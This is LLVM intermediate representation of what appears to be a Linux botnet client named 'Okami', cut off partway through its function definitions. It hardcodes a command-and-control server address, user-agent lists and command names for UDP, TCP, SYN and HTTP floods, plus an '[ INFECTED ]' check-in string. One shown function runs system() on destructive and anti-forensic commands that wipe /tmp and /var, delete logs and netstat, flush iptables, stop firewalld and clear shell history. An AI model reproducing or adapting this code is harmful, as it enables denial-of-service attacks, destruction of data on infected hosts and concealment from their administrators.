; ModuleID = 'host/ir_O0/Okami.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [21 x i8] c"168.235.109.208:6963\00", align 1
@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.17 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.18 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.20 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.21 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.23 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.24 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.25 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.27 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.28 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.30 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.31 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.33 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.36 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.37 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.38 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.39 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.40 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.41 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.42 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.43 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.44 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.45 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.46 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.47 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.48 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.49 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.51 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.52 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.53 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.54 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.55 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.56 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.57 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.58 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.59 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.60 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.61 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.62 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.63 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.64 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.65 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.66 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.67 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.68 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.69 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.70 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.71 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.72 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.10 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.12 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.13 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.14 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.133 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.73 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@SendSTDHEX.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.75, i32 0, i32 0)], align 8
@.str.75 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.101, i32 0, i32 0)], align 16
@.str.76 = private unnamed_addr constant [17 x i8] c"WYHRzp68omQcEaoW\00", align 1
@.str.77 = private unnamed_addr constant [17 x i8] c"xYjPH0XYQyNnZDd4\00", align 1
@.str.78 = private unnamed_addr constant [20 x i8] c"KaDeNTheBoTNETHeGOD\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"Iger8HgN8DU5Cv2m\00", align 1
@.str.80 = private unnamed_addr constant [17 x i8] c"E0H2DeSLyzQ93Bh2\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"zhYf0MvzTJ1S0ivq\00", align 1
@.str.82 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.83 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.84 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.85 = private unnamed_addr constant [17 x i8] c"UQX1v4chpBay13JL\00", align 1
@.str.86 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.87 = private unnamed_addr constant [17 x i8] c"X1k5ICjenaWIZ4Gf\00", align 1
@.str.88 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.89 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.90 = private unnamed_addr constant [17 x i8] c"1cvFW1QcSuZ627CQ\00", align 1
@.str.91 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.92 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.93 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.95 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.96 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.97 = private unnamed_addr constant [21 x i8] c"UkXK4CDG3OBO1vVufiKv\00", align 1
@.str.98 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.99 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.100 = private unnamed_addr constant [17 x i8] c"SllNepLi918c9I8J\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"Kaden1337\00", align 1
@.str.102 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.103 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.104 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.112 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.116 = private unnamed_addr constant [7 x i8] c"STDHEX\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"EXITFAG\00", align 1
@.str.119 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.120 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.126 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.127 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.121 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.122 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.128 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.130 = private unnamed_addr constant [35 x i8] c"[ INFECTED ] Arch: %s || Type: %s]\00", align 1
@.str.131 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.132 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.10, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.12, i32 0, i32 0))
